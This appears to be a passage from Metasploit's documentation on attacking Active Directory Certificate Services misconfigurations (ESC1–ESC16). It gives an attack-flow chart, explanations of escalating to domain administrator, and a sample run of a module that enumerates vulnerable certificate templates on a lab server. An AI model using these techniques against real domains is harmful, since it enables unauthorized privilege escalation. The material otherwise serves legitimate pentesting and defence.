href="/docs/development/google-summer-of-code/gsoc-2017-mentor-organization-application.html" class="nav-list-link">2017 Mentor Organization Application</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html" class="nav-list-link">2017 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html" class="nav-list-link">2017 Student Proposal</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html" class="nav-list-link">2018 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2019-project-ideas.html" class="nav-list-link">2019 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2020-project-ideas.html" class="nav-list-link">2020 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2021-project-ideas.html" class="nav-list-link">2021 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2022-project-ideas.html" class="nav-list-link">2022 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2023-project-ideas.html" class="nav-list-link">2023 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html" class="nav-list-link">How to Apply to GSoC</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/maintainers/" class="nav-list-link">Maintainers</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/maintainers/committer-keys.html" class="nav-list-link">Committer Keys</a><li class="nav-list-item active"><a href="/docs/development/maintainers/committer-rights.html" class="nav-list-link">Committer Rights</a><li class="nav-list-item active"><a href="/docs/development/maintainers/downloads-by-version.html" class="nav-list-link">Downloads by Version</a><li class="nav-list-item active"><a href="/docs/development/maintainers/metasploit-hackathons.html" class="nav-list-link">Metasploit Hackathons</a><li class="nav-list-item active"><a href="/docs/development/maintainers/metasploit-loginpalooza.html" class="nav-list-link">Metasploit Loginpalooza</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/maintainers/process/" class="nav-list-link">Process</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/maintainers/process/assigning-labels.html" class="nav-list-link">Assigning Labels</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/guidelines-for-accepting-modules-and-enhancements.html" class="nav-list-link">Guidelines for Accepting Modules and Enhancements</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/how-to-deprecate-a-metasploit-module.html" class="nav-list-link">How to deprecate a Metasploit module</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/landing-pull-requests.html" class="nav-list-link">Landing Pull Requests</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/adding-release-notes-to-prs.html" class="nav-list-link">Release Notes</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/rolling-back-merges.html" class="nav-list-link">Rolling back merges</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/unstable-modules.html" class="nav-list-link">Unstable Modules</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/maintainers/ruby-gems/" class="nav-list-link">Ruby Gems</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/maintainers/ruby-gems/how-to-add-and-update-gems-in-metasploit-framework.html" class="nav-list-link">Adding and Updating</a><li class="nav-list-item active"><a href="/docs/development/maintainers/ruby-gems/merging-metasploit-payload-gem-updates.html" class="nav-list-link">Merging Metasploit Payload Gem Updates</a><li class="nav-list-item active"><a href="/docs/development/maintainers/ruby-gems/using-local-gems.html" class="nav-list-link">Using local Gems</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/propsals/" class="nav-list-link">Proposals</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/propsals/bundled-modules-proposal.html" class="nav-list-link">Bundled Modules Proposal</a><li class="nav-list-item active"><a href="/docs/development/propsals/java-meterpreter-feature-parity-proposal.html" class="nav-list-link">Java Meterpreter Feature Parity Proposal</a><li class="nav-list-item active"><a href="/docs/development/propsals/msf6-feature-proposals.html" class="nav-list-link">MSF6 Feature Proposals</a><li class="nav-list-item active"><a href="/docs/development/propsals/metasploit-url-support-proposal.html" class="nav-list-link">Metasploit URL support proposal</a><li class="nav-list-item active"><a href="/docs/development/propsals/payload-rename-justification.html" class="nav-list-link">Payload Rename Justification</a><li class="nav-list-item active"><a href="/docs/development/propsals/uberhandler.html" class="nav-list-link">Uberhandler</a><li class="nav-list-item active"><a href="/docs/development/propsals/work-needed-to-allow-msfdb-to-use-postgresql-common.html" class="nav-list-link">Work needed to allow msfdb to use postgresql common</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/quality/" class="nav-list-link">Quality</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/quality/common-metasploit-module-coding-mistakes.html" class="nav-list-link">Common Metasploit Module Coding Mistakes</a><li class="nav-list-item active"><a href="/docs/development/quality/loading-test-modules.html" class="nav-list-link">Loading Test Modules</a><li class="nav-list-item active"><a href="/docs/development/quality/measuring-metasploit-performance.html" class="nav-list-link">Measuring Metasploit Performance</a><li class="nav-list-item active"><a href="/docs/development/quality/msftidy.html" class="nav-list-link">Msftidy</a><li class="nav-list-item active"><a href="/docs/development/quality/payload-testing.html" class="nav-list-link">Payload Testing</a><li class="nav-list-item active"><a href="/docs/development/quality/style-tips.html" class="nav-list-link">Style Tips</a><li class="nav-list-item active"><a href="/docs/development/quality/using-rubocop.html" class="nav-list-link">Using Rubocop</a><li class="nav-list-item active"><a href="/docs/development/quality/writing-module-documentation.html" class="nav-list-link">Writing Module Documentation</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/roadmap/" class="nav-list-link">Roadmap</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/roadmap/2017-roadmap.html" class="nav-list-link">2017 Roadmap</a><li class="nav-list-item active"><a href="/docs/development/roadmap/2017-roadmap-review.html" class="nav-list-link">2017 Roadmap Review</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-breaking-changes.html" class="nav-list-link">Metasploit Breaking Changes</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-data-service-enhancements-goliath.html" class="nav-list-link">Metasploit Data Service</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-5-release-notes.html" class="nav-list-link">Metasploit Framework 5.0 Release Notes</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-6-release-notes.html" class="nav-list-link">Metasploit Framework 6.0 Release Notes</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-framework-wish-list.html" class="nav-list-link">Metasploit Framework Wish List</a></ul></ul><li class="nav-list-item active"><a href="/docs/contact.html" class="nav-list-link">Contact</a></ul></nav><footer class="site-footer"> This site uses <a href="https://github.com/pmarsceill/just-the-docs">Just the Docs</a>, a documentation theme for Jekyll.</footer></div><div class="main" id="top"><div id="main-header" class="main-header"><div class="search"><div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search Metasploit Documentation" aria-label="Search Metasploit Documentation" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label></div><div id="search-results" class="search-results"></div></div><link rel="stylesheet" href="/assets/css/main.css"><nav aria-label="Auxiliary" class="aux-nav"><ul class="aux-nav-list"><li class="aux-nav-list-item"> <a href="//github.com/rapid7/metasploit-framework" class="site-button" target="_blank" rel="noopener noreferrer" > Metasploit Framework on GitHub </a></ul></nav></div><div id="main-content-wrap" class="main-content-wrap"><nav aria-label="Breadcrumb" class="breadcrumb-nav"><ol class="breadcrumb-nav-list"><li class="breadcrumb-nav-list-item"> <a href="/docs/pentesting/">Pentesting</a><li class="breadcrumb-nav-list-item"> <a href="/docs/pentesting/active-directory/">Active Directory</a><li class="breadcrumb-nav-list-item"> <a href="/docs/pentesting/active-directory/ad-certificates/">AD CS</a><li class="breadcrumb-nav-list-item"> <span>Attacking AD CS ESC Vulnerabilities Using Metasploit</span></ol></nav><div id="main-content" class="main-content" role="main"><h1 id="setting-up-an-ad-cs-target"> <a href="#setting-up-an-ad-cs-target" class="anchor-heading" aria-labelledby="setting-up-an-ad-cs-target"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Setting Up An AD CS Target</h1><p>Follow the instructions <a href="/docs/pentesting/active-directory/ad-certificates/overview.html">here</a> to set up an AD CS server for testing purposes.</p><h1 id="introduction-to-ad-cs-vulnerabilities"> <a href="#introduction-to-ad-cs-vulnerabilities" class="anchor-heading" aria-labelledby="introduction-to-ad-cs-vulnerabilities"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Introduction to AD CS Vulnerabilities</h1><pre><code class="language-mermaid">flowchart TD
    subgraph ad_cs_cert_templates[&lt;b&gt;ad_cs_cert_templates&lt;/b&gt;]
        ESC4(ESC4)
        update_template[&lt;i&gt;Update Template&lt;/i&gt;]
        ESC4 -- abuse privileges --&gt; update_template
    end
    subgraph relay/esc8[&lt;b&gt;relay/esc8&lt;/b&gt;]
        ESC8(ESC8)
        ESC8 --&gt; web_enrollment[&lt;i&gt;Issuance via Web Enrollment&lt;/i&gt;]
    end
    subgraph esc_update_ldap_object[&lt;b&gt;esc_update_ldap_object&lt;/b&gt;]
        ESC9(ESC9) --&gt; weak_certificate_mapping[&lt;i&gt;Issuance via Weak Certificate Mapping&lt;/i&gt;]
        ESC10(ESC10) --&gt; weak_certificate_mapping[&lt;i&gt;Issuance via Weak Certificate Mapping&lt;/i&gt;]
        ESC16(ESC16) --&gt; weak_certificate_mapping[&lt;i&gt;Issuance via Weak Certificate Mapping&lt;/i&gt;]
    end
    subgraph icpr_cert[&lt;b&gt;icpr_cert&lt;/b&gt;]
        ESC1(ESC1)
        ESC2(ESC2)
        ESC3(ESC3)
        ESC13(ESC13)
        ESC15(ESC15)
        alt_subject[&lt;i&gt;Alternate Subject Issuance&lt;/i&gt;]
        add_policies[&lt;i&gt;Alternate Subject Issuance&lt;/i&gt;&lt;br&gt;and&lt;br&gt;&lt;i&gt;Add Policy OIDs&lt;/i&gt;]
        as_eagent[&lt;i&gt;Enrollment Agent Issuance&lt;/i&gt;]
        normal[&lt;i&gt;Normal Issuance&lt;/i&gt;]

        ESC1 --&gt; alt_subject
        ESC2 --&gt; as_eagent
        ESC3 --&gt; as_eagent
        ESC13 --&gt; normal
        ESC15 --&gt; add_policies
        as_eagent -- use new certificate --&gt; normal
    end
    subgraph kerberos/get_ticket[&lt;b&gt;kerberos/get_ticket&lt;/b&gt;]
        PKINIT[&lt;i&gt;PKINIT&lt;/i&gt;]
    end
    subgraph ldap/ldap_login[&lt;b&gt;ldap/ldap_login&lt;/b&gt;]
        SCHANNEL[&lt;i&gt;SCHANNEL&lt;/i&gt;]
    end
    subgraph ldap_esc_vulnerable_cert_finder[&lt;b&gt;ldap_ecs_vulnerable_cert_finder&lt;/b&gt;]
        find_vulnerable_templates[&lt;i&gt;Find Vulnerable Templates&lt;/i&gt;]
    end
    add_policies -- add client authentication oid --&gt; SCHANNEL
    add_policies -- add certificate request agent oid --&gt; as_eagent
    alt_subject --&gt; PKINIT
    alt_subject --&gt; SCHANNEL
    find_vulnerable_templates --&gt; icpr_cert
    normal --&gt; PKINIT
    normal --&gt; SCHANNEL
    update_template --&gt; ESC1
    web_enrollment --&gt; PKINIT
    web_enrollment --&gt; SCHANNEL
    weak_certificate_mapping --&gt; PKINIT
    weak_certificate_mapping --&gt; SCHANNEL
</code></pre><p>The chart above showcases how one can go about attacking each of the AD CS vulnerabilities supported by Metasploit, taking advantage of various flaws in how certificate templates are configured on an Active Directory Certificate Server.</p><p>The following sections will walk through each of these steps, starting with enumerating certificate templates that the server has to offer and identifying those that are vulnerable to various misconfigurations and security flaws, followed by creating new certificates using these certificate templates with the <code class="language-plaintext highlighter-rouge">icpr_cert</code> Metasploit module, and finally using these certificates to authenticate to the domain as the domain administrator via Kerberos.</p><p>Each certificate template vulnerability that will be discussed here has a ESC code, such as ESC1, ESC2. These ESC codes are taken from the original whitepaper that SpecterOps published which popularized these certificate template attacks, known as <a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">Certified Pre-Owned</a>. In this paper Will Schroeder and Lee Christensen described 8 different domain escalation attacks that they found they could conduct via misconfigured certificate templates:</p><ul><li>ESC1 - Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT<ul><li><a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html#using-the-esc1-vulnerability-to-get-a-certificate-as-the-domain-administrator">Exploit Steps</a></ul><li>ESC2 - Domain escalation via No Issuance Requirements + Enrollable Any Purpose EKU or no EKU<ul><li><a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html#exploiting-esc2-to-gain-domain-administrator-privileges">Exploit Steps</a></ul><li>ESC3 - Domain escalation via No Issuance Requirements + Certificate Request Agent EKU + no enrollment agent restrictions<ul><li><a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html#exploiting-esc3-to-gain-domain-administrator-privileges">Exploit Steps</a></ul><li>ESC4 - Domain escalation via misconfigured certificate template access control<ul><li><a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html#exploiting-esc4-to-gain-domain-administrator-privileges">Exploit Steps</a></ul><li>ESC5 - Domain escalation via vulnerable PKI AD Object Access Control<li>ESC6 - Domain escalation via the EDITF_ATTRIBUTESUBJECTALTNAME2 setting on CAs + No Manager Approval + Enrollable Client Authentication/Smart Card Logon OID templates<li>ESC7 - Vulnerable Certificate Authority Access Control<li>ESC8 - NTLM Relay to AD CS HTTP Endpoints<ul><li><a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html#exploiting-esc8">Exploit Steps</a></ul></ul><p>Later, additional techniques were disclosed by security researchers:</p><ul><li>ESC9 - No Security Extension - CT_FLAG_NO_SECURITY_EXTENSION flag set in <code class="language-plaintext highlighter-rouge">msPKI-EnrollmentFlag</code>. Also <code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> not set to 2 or <code class="language-plaintext highlighter-rouge">CertificateMappingMethods</code> contains <code class="language-plaintext highlighter-rouge">UPN</code> flag.<ul><li><a href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7">Certipy 4.0: ESC9 &amp; ESC10, BloodHound GUI, New Authentication and Request Methods — and more!</a><li><a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html#exploiting-esc9">Exploit Steps</a></ul><li>ESC10 - Weak Certificate Mappings - <code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel CertificateMappingMethods</code> contains <code class="language-plaintext highlighter-rouge">UPN</code> bit aka <code class="language-plaintext highlighter-rouge">0x4</code> or <code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc StrongCertificateBindingEnforcement</code> is set to <code class="language-plaintext highlighter-rouge">0</code>.<ul><li><a href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7">Certipy 4.0: ESC9 &amp; ESC10, BloodHound GUI, New Authentication and Request Methods — and more!</a><li><a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html#exploiting-esc10">Exploit Steps</a></ul><li>ESC11 - Relaying NTLM to ICPR - Relaying NTLM authentication to unprotected RPC interface is allowed due to lack of the <code class="language-plaintext highlighter-rouge">IF_ENFORCEENCRYPTICERTREQUEST</code> flag on <code class="language-plaintext highlighter-rouge">Config.CA.Interface.Flags</code>.<ul><li><a href="https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/">Relaying to AD Certificate Services over RPC</a></ul><li>ESC12 - A user with shell access to a CA server using a YubiHSM2 hardware security module can access the CA’s private key.<ul><li><a href="https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm">Shell access to ADCS CA with YubiHSM</a></ul><li>ESC13 - Domain escalation via issuance policies with group links.<ul><li><a href="https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53">ADCS ESC13 Abuse Technique</a><li><a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html#exploiting-esc13">Exploit Steps</a></ul><li>ESC14 - Explicit certificate mappings through <code class="language-plaintext highlighter-rouge">altSecurityIdentities</code> write access abuse<ul><li><a href="https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9">ADCS ESC14 Abuse Technique</a></ul><li>ESC15 (AKA EKUwu) - Domain escalation via No Issuance Requirements + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Policy OID manipulation<ul><li><a href="https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc">EKUwu: Not just another AD CS ESC</a><li><a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html#exploiting-esc15">Exploit Steps</a></ul><li>ESC16 - Security Extension Disabled on CA (Globally)<ul><li><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally">ESC16 - Security Extension Disabled on CA</a> Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, ESC4, ESC8, ESC9, ESC10, ESC13, ESC15 and ESC16.</ul><li><a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html#exploiting-esc16">Exploit Steps</a></ul><p>Before continuing, it should be noted that ESC1 is slightly different than ESC2 and ESC3 as the diagram notes above. This is because in ESC1, one has control over the <code class="language-plaintext highlighter-rouge">subjectAltName</code> field in the generated certificate, which is also known as the <code class="language-plaintext highlighter-rouge">SAN</code> field. This field allows one to specify who the certificate should authenticate as. Therefore, all an attacker needs to do is simply modify this field and they can gain a certificate that allows them to authenticate as any user they wish.</p><p>ESC2 is similar to ESC1 in all respects, however it differs in one key area. This is because, unlike ESC1 vulnerable certificate templates, you cannot edit the <code class="language-plaintext highlighter-rouge">subjectAltName</code> field, of ESC2 vulnerable certificate templates. Additionally, ESC2 certificate templates define the <code class="language-plaintext highlighter-rouge">Any Purpose</code> extended key usage (EKU) or no EKU at all. This last part is important as it allows an attacker to utilize the ESC2 vulnerable certificate template to create a new certificate that can be used to authorize to log into a domain via Kerberos on behalf of any other user, thereby granting them access to the domain as that user. Note that certificates with no EKU at all will need to be trusted by the <code class="language-plaintext highlighter-rouge">NTAuthCertificates</code> object (which it won’t be by default), otherwise new certificates that are created using the vulnerable ESC2 certificate template will not work for domain authentication. This restriction does not apply for those certificates vulnerable to ESC2 which have the <code class="language-plaintext highlighter-rouge">Any Purpose</code> EKU applied to them.</p><p>Next, ESC3 is fairly similar to ESC2, however it differs in two ways: a different EKU is abused, and the attacker also needs to utilize two different misconfigured certificate templates in order to exploit the vulnerability. The EKU in question this time is the Certificate Request Agent EKU, aka OID 1.3.6.1.4.1.311.20.2.1, which allows one to enroll for a certificate on behalf of another user, which may seem unusual, but this a common scenario within Microsoft environments. To abuse this EKU, an attacker must have the following two vulnerable certificate templates:</p><ol><li>A certificate template which has all the same permissions as ESC1, however it also has the Certificate Request Agent EKU set on it, aka OID 1.3.6.1.4.1.311.20.2.1. This certificate template is labeled as <code class="language-plaintext highlighter-rouge">ESC3_TEMPLATE_1</code> within the output of the <code class="language-plaintext highlighter-rouge">ldap_esc_vulnerable_cert_finder</code> module we will use later on.<li>A certificate template that allows low privileged users to enroll in it, and has manager approval disabled, same as ESC1. However it also has either:<ul><li>A template schema of 1<li>A template schema of 2 or greater and an Application Policy Issuance Requirement requiring the Certificate Request Agent EKU so that only those who have a certificate with this requirement can enroll in them. It must also define an EKU that allows for domain authentication, same as ESC1, and there must be no enrollment restrictions on the Certificate Authority (CA) server in question. This certificate template is labeled as <code class="language-plaintext highlighter-rouge">ESC3_TEMPLATE_2</code> within the output of the <code class="language-plaintext highlighter-rouge">ldap_esc_vulnerable_cert_finder</code> module we will use later on.</ul></ol><p>If both of these criteria are met then the attacker can enroll in one of the <code class="language-plaintext highlighter-rouge">ESC3_TEMPLATE_1</code> vulnerable certificate templates as a low privileged user in order to get a certificate that will grant them Certificate Request Agent permissions. They can then use these permissions to enroll in a <code class="language-plaintext highlighter-rouge">ESC3_TEMPLATE_2</code> vulnerable certificate template and request a certificate on behalf of another user, such as the domain administrator, and utilize the fact that the certificate template allows for domain authentication to log into the domain via Kerberos as that user.</p><h2 id="finding-vulnerable-esc-templates-using-ldap_esc_vulnerable_cert_finder"> <a href="#finding-vulnerable-esc-templates-using-ldap_esc_vulnerable_cert_finder" class="anchor-heading" aria-labelledby="finding-vulnerable-esc-templates-using-ldap_esc_vulnerable_cert_finder"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Finding Vulnerable ESC Templates Using ldap_esc_vulnerable_cert_finder</h2><p>Before one can exploit vulnerable ESC templates to elevate privileges, it is necessary to first find a list of vulnerable templates that exist on a domain. To do this we can run the <code class="language-plaintext highlighter-rouge">auxiliary/gather/ldap_esc_vulnerable_cert_finder</code> module. This module will connect to the LDAP server on a target Domain Controller (DC), and will run a set of LDAP queries to gather a list of certificate authority (CA) servers and the vulnerable certificate templates they make available for enrollment. It will then also query the permissions on both the CA and the certificate template to figure out which users or groups can use that certificate template to elevate their privileges.</p><p>Currently the module is capable of checking for certificates that are vulnerable to ESC1, ESC2, ESC3, ESC13 and ESC15. The module is limited to checking for these techniques due to them being identifiable remotely from a normal user account by analyzing the objects in LDAP.</p><p>Keep in mind though that there are two sets of permissions in play here though. There is one set of permissions on the CA server that control who is able to enroll in any certificate template from that server, and second set of permissions that control who is allowed to enroll in a specific certificate template, which is applied to the certificate template itself. Therefore, the module will also specify which users are allowed to enroll in a specific template on a specific CA server, in order to make it as clear as possible which users or groups one needs to have access to in order to exploit the vulnerable certificate template.</p><p>The following diagram showcases how this permissions check works in a more visual manner:</p><pre><code class="language-mermaid">flowchart TD
    user[User] --&gt; firstcheck{CA Server Allows Enrollment?}
	firstcheck{CA Server Allows Enrollment?} -- YES --&gt; secondcheck{Certificate Template Allows Enrollment?}
	firstcheck{CA Server Allows Enrollment?} -- NO --&gt; denied[Access Denied]
	secondcheck{Certificate Template Allows Enrollment?} -- NO --&gt; denied[Access Denied]
	secondcheck{Certificate Template Allows Enrollment?} -- YES --&gt; success[Access Granted!]
</code></pre><p>To run the module, you will need to have the login credentials of a domain joined user. The specific permissions of this user should not matter though, since most LDAP servers in an Active Directory (AD) environment are configured in such a way that they allow users to read most objects, but not write to them. For our purposes, since we just need to read the details of the certificate templates that are available, this means normal user permissions should be sufficient.</p><p>To run the module, specify the login credentials for an AD user, and set <code class="language-plaintext highlighter-rouge">RHOSTS</code> to the address of one of the Domain Controller (DC) IP addresses, then enter <code class="language-plaintext highlighter-rouge">run</code>. This will cause the module to log into the LDAP server on the target DC, and list out the vulnerable certificate templates and which CA servers they are available from, as well as the permissions that are required to enroll in these certificate templates. The following is a sample output of running this against a test server:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> <span class="p">&gt;</span> use auxiliary/gather/ldap_esc_vulnerable_cert_finder
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_esc_vulnerable_cert_finder</span><span class="p">)</span> <span class="p">&gt;</span> show options

Module options (auxiliary/gather/ldap_esc_vulnerable_cert_finder):

   Name                   Current Setting  Required  Description
   ----                   ---------------  --------  -----------
   BASE_DN                                 no        LDAP base DN if you already have it
   DOMAIN                                  no        The domain to authenticate to
   PASSWORD                                no        The password to authenticate with
   REPORT_NONENROLLABLE   false            yes       Report nonenrollable certificate templates
   REPORT_PRIVENROLLABLE  false            yes       Report certificate templates restricted to domain
                                                      and enterprise admin
   RHOSTS                                  yes       The target host(s), see https://github.com/rapid7/metasploit
                                                     -framework/wiki/Using-Metasploit
   RPORT                  389              yes       The target port
   SSL                    false            no        Enable SSL on the LDAP connection
   USERNAME                                no        The username to authenticate with


View the full module info with the info, or info -d command.

<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_esc_vulnerable_cert_finder</span><span class="p">)</span> <span class="p">&gt;</span> set DOMAIN DAFOREST
DOMAIN =&gt; DAFOREST
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_esc_vulnerable_cert_finder</span><span class="p">)</span> <span class="p">&gt;</span> set USERNAME normaluser
USERNAME =&gt; normaluser
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_esc_vulnerable_cert_finder</span><span class="p">)</span> <span class="p">&gt;</span> set PASSWORD normalpass
PASSWORD =&gt; normalpass
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_esc_vulnerable_cert_finder</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 172.30.239.85
RHOSTS =&gt; 172.30.239.85
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_esc_vulnerable_cert_finder</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> Discovering base DN automatically
<span class="zg">[+]</span> 172.30.239.85:389 Discovered base DN: DC=daforest,DC=com
<span class="zg">[+]</span> Template: ESC1-Template
<span class="zs">[*]</span>   Distinguished Name: CN=ESC1-Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span>   Manager Approval: Disabled
<span class="zs">[*]</span>   Required Signatures: 0
<span class="zg">[+]</span>   Vulnerable to: ESC1
<span class="zs">[*]</span>   Notes: ESC1: Request can specify a subjectAltName (msPKI-Certificate-Name-Flag)
<span class="zs">[*]</span>   Certificate Template Enrollment SIDs:
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
<span class="zg">[+]</span>   Issuing CA: daforest-WIN-BR0CCBA815B-CA (WIN-BR0CCBA815B.daforest.com)
<span class="zs">[*]</span>     Enrollment SIDs:
<span class="zs">[*]</span>       * S-1-5-11 (Authenticated Users)
<span class="zg">[+]</span> Template: ESC2-Template
<span class="zs">[*]</span>   Distinguished Name: CN=ESC2-Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span>   Manager Approval: Disabled
<span class="zs">[*]</span>   Required Signatures: 0
<span class="zg">[+]</span>   Vulnerable to: ESC2
<span class="zs">[*]</span>   Notes: ESC2: Template defines the Any Purpose OID or no EKUs (PkiExtendedKeyUsage)
<span class="zs">[*]</span>   Certificate Template Enrollment SIDs:
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
<span class="zg">[+]</span>   Issuing CA: daforest-WIN-BR0CCBA815B-CA (WIN-BR0CCBA815B.daforest.com)
<span class="zs">[*]</span>     Enrollment SIDs:
<span class="zs">[*]</span>       * S-1-5-11 (Authenticated Users)
<span class="zg">[+]</span> Template: ESC3-Template1
<span class="zs">[*]</span>   Distinguished Name: CN=ESC3-Template1,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span>   Manager Approval: Disabled
<span class="zs">[*]</span>   Required Signatures: 0
<span class="zg">[+]</span>   Vulnerable to: ESC3_TEMPLATE_1
<span class="zs">[*]</span>   Notes: ESC3: Template defines the Certificate Request Agent OID (PkiExtendedKeyUsage)
<span class="zs">[*]</span>   Certificate Template Enrollment SIDs:
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
<span class="zg">[+]</span>   Issuing CA: daforest-WIN-BR0CCBA815B-CA (WIN-BR0CCBA815B.daforest.com)
<span class="zs">[*]</span>     Enrollment SIDs:
<span class="zs">[*]</span>       * S-1-5-11 (Authenticated Users)
<span class="zg">[+]</span> Template: User
<span class="zs">[*]</span>   Distinguished Name: CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span>   Manager Approval: Disabled
